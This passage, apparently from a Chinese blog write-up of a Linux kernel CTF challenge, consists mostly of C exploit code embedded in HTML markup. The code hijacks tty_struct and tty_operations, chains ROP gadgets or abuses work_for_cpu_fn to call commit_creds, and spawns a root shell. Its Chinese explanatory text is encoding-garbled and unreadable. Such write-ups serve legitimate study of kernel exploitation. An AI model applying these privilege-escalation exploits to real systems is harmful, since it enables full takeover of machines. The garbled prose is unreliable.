PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br>    prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>    commit_creds = COMMIT_CREDS + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] prepare_kernel_cred: 0x%llx\n&quot;</span>, prepare_kernel_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br><br>    <span class="hljs-comment">//find two notes isn&#x27;t tty</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-keyword">if</span> (*((<span class="hljs-type">int</span>*)tty_data) != <span class="hljs-number">0x5401</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span>)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake tty_operations at idx \033[0m%d.\n&quot;</span>, fake_tty_ops_idx = i);<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Fake stack at idx \033[0m%d.\n&quot;</span>, fake_stack_idx = i);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fake_tty_ops_idx == <span class="hljs-number">-1</span> || fake_stack_idx == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;Unable to find two notes,try again&quot;</span>);<br>    <br>    edit(fake_tty_ops_idx,<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations),fake_tty_data);<br>    edit(fake_stack_idx,<span class="hljs-number">0x100</span>,rop);<br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake tty_operations: \033[0m%p.\n&quot;</span>, notebook[fake_tty_ops_idx].buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the fake stack: \033[0m%p.\n&quot;</span>, notebook[fake_stack_idx].buf);<br><br>    <span class="hljs-comment">//copy the tty_data to fake_tty_data</span><br>    read(note_fd,tty_data,tty_idx);<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_data,tty_data,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x200</span>);<br><br>    <span class="hljs-comment">// first migration to tty_struct</span><br>    ((<span class="hljs-keyword">struct</span> tty_operations*)fake_tty_ops_data)-&gt;write=push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret+kernel_offset;<br>    <span class="hljs-comment">//second migration back tty_ops</span><br>    fake_tty_data[<span class="hljs-number">1</span>]=pop_rbx_pop_rbp_ret+kernel_offset;<br>    fake_tty_data[<span class="hljs-number">3</span>]=notebook[fake_tty_ops_idx].buf;<br>    fake_tty_data[<span class="hljs-number">4</span>]=mov_rsp_rbp_pop_rbp_ret+kernel_offset;<br>    <span class="hljs-comment">// third migration to stack</span><br>    fake_tty_ops_data[<span class="hljs-number">1</span>] = pop_rbp_ret + kernel_offset;<br>    fake_tty_ops_data[<span class="hljs-number">2</span>] = notebook[fake_stack_idx].buf;<br>    fake_tty_ops_data[<span class="hljs-number">3</span>] = mov_rsp_rbp_pop_rbp_ret + kernel_offset;<br>    <br>    <span class="hljs-type">int</span> rop_idx=<span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<span class="hljs-comment">//rbp</span><br>    rop[rop_idx++] = pop_rdi_ret + kernel_offset;<br>    rop[rop_idx++] = init_cred+kernel_offset;<br>    rop[rop_idx++] = commit_creds;<br><br>    rop[rop_idx++] = swapgs_restore_regs_and_return_to_usermode+<span class="hljs-number">22</span>+kernel_offset;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = <span class="hljs-number">0</span>;<br>    rop[rop_idx++] = (<span class="hljs-type">size_t</span>)&amp;getRootShell;<br>    rop[rop_idx++] = user_cs;<br>    rop[rop_idx++] = user_rflags;<br>    rop[rop_idx++] = user_sp;<br>    rop[rop_idx++] = user_ss;<br><br>    write(note_fd,rop,fake_stack_idx);<br>    write(note_fd,fake_tty_ops_data,fake_tty_ops_idx);<br>    write(note_fd,fake_tty_data,tty_idx);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] TTY DATA hijack done.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//trigger</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100</span>; i++)<br>        write(tty_fd[i],page, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­è®¾ç½®cpuå’Œå¯¹çº¿ç¨‹çš„é¡ºåºè®¿é—®ï¼Œè¿˜æœ‰åœ¨åˆ›å»ºçº¿ç¨‹åsleepä¸€ä¼šï¼Œéƒ½èƒ½æé«˜ä¸€ä¸‹ç¨³å®šæ€§åº”è¯¥</p><blockquote><p>cpu_set_t pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>CPU_SET(0, &amp;pwn_cpu);</p><p>sem_init(&amp;sem_add, 0, 0);<br>sem_post(&amp;sem_edit);<br>sem_wait(&amp;sem_edit);</p><p>sleep(1)</p></blockquote><p>ä½†æ˜¯å®é™…è¿™ç§æ‰“æ³•è¿˜æ˜¯ä¸å¤ªç¨³å®šï¼Œé•¿äº­æœ‰ç§è§£æ³•ç”¨<code>work_for_cpu_fn</code>å‡½æ•°,èƒ½ç¨³å®šåˆ©ç”¨</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10-1684500912096.png" alt="10"></p><h4 id="0x03è§£æ³•2ï¼š-2">0x03è§£æ³•2ï¼š</h4><p>å°±æ˜¯ç”¨<code>work_for_cpu_fn</code>è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥ä¸ç”¨rop</p><blockquote><p>è¯¥å‡½æ•°ä½äº workqueue æœºåˆ¶çš„å®ç°ä¸­ï¼Œåªè¦æ˜¯å¼€å¯äº†å¤šæ ¸æ”¯æŒçš„å†…æ ¸ ï¼ˆCONFIG_SMPï¼‰éƒ½ä¼šåŒ…å«è¿™ä¸ªå‡½æ•°çš„ä»£ç ã€‚</p></blockquote><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/11.png" alt="11"></p><p>å°±è¿™å¥<code>wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</code></p><p>åœ¨idaé‡Œæ˜¯è¿™æ ·çš„</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/12.png" alt="12"></p><p>åœ¨è¿™é¢˜é‡Œæˆ‘ä»¬</p><p>ç¬¬ä¸€æ¬¡ä½¿ç”¨</p><blockquote><p>a1+32(wfc-&gt;fn)=prepare_kernel_cred</p><p>a1+40(wfc-&gt;arg)=Null</p><p>å°±ä¼šæ‰§è¡Œprepare_kernel_cred(Null)</p><p>è¿”å›å€¼å­˜åˆ°a1+48(wfc-&gt;ret)</p></blockquote><p>ç¬¬äºŒæ¬¡ä½¿ç”¨</p><blockquote><p>a1+32(wfc-&gt;fn)=commit_creds</p><p>a1+40(wfc-&gt;arg)=ç¬¬ä¸€æ¬¡çš„è¿”å›å€¼</p><p>å°±ä¼šæ‰§è¡Œcommit_creds(prepare_kernel_cred(Null))ææƒåˆ°root</p></blockquote><p>è§£æ³•è½¬å˜ä¸ºåŠ«æŒtty_ops-&gt;ioctlä¸ºwork_for_cpu_fn</p><blockquote><p>å› ä¸º tty_struct[4] å¤„æˆå‘˜ <code>ldisc_sem</code> ä¸ºä¿¡å·é‡ï¼Œåœ¨æ‰§è¡Œåˆ° work_for_cpu_fn ä¹‹å‰<strong>è¯¥å€¼ä¼šè¢«æ›´æ”¹</strong></p></blockquote><p>ç„¶åæ‰§è¡Œä¸¤æ¬¡ï¼Œä¸€æ¬¡prepare_kernel_cred(Null)ï¼Œä¸€æ¬¡commit_creds(ç¬¬ä¸€æ¬¡çš„è¿”å›å€¼)</p><h5 id="Exp-2">Exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o try -pthread -static -masm=intel -Os try.c -lutil</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> work_for_cpu_fn 0xffffffff8109eb90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cred_init 0xffffffff8250a0e9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff8225c940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> max_spray_times 0x100</span><br><br><span class="hljs-type">int</span> note_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x800</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf,*page;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> cnt;<br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span>* buf;<br>&#125; Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>* buf;<br>    <span class="hljs-type">size_t</span> size;<br>    <br>&#125;notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note_fd,<span 